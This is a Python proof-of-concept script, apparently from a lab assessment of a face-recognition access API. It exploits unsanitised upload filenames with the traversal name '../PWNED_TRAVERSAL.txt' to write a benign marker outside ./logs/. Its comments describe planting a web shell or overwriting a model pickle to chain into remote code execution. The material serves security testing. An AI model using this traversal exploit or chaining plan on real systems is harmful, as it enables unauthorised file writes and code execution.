"""PoC #2 - path traversal / unsafe file write.

The endpoint does save_path = os.path.join("./logs/", file.filename) and saves
to it. The client controls the filename and it is never sanitized, so a filename
with ".." escapes ./logs/ and writes wherever the process can reach - e.g. plant
a web shell, or overwrite a model .pkl to chain into PoC #1.

We upload a benign text marker with a traversal filename and check where it
lands. Loopback only.
"""
import os
import sys
from _labclient import post_multipart

BASE = os.environ.get("BASE", "http://127.0.0.1:8080")
URL = BASE + "/api/access"
KEY = os.environ.get("API_KEY", "")
HDRS = {"X-API-Key": KEY} if KEY else None

# ./logs/../PWNED_TRAVERSAL.txt -> escapes the logs dir into the APP ROOT,
# i.e. the same directory as lab_access_api.py and the model .pkl files. A real
# attacker could instead target ../models/face_recognition_model.pkl (chaining
# into PoC #1 for RCE) or any writable path. We use a benign marker.
EVIL_FILENAME = "../PWNED_TRAVERSAL.txt"
PAYLOAD = b"benign marker: path traversal write escaped ./logs/ into the app root\n"


def main():
    print(f"[*] POST {URL}")
    print(f"[*] malicious filename = {EVIL_FILENAME!r}")
    status, body = post_multipart(URL, "image", EVIL_FILENAME, PAYLOAD, headers=HDRS)
    print(f"[*] HTTP {status}  (request may 500 on the model step; file.save()")
    print(f"    runs BEFORE that crash, so the out-of-bounds write already happened)")
    print("[*] body[:200]:", body[:200].replace("\n", " "))
    print("[*] Proof is verified on the container filesystem by the orchestrator.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
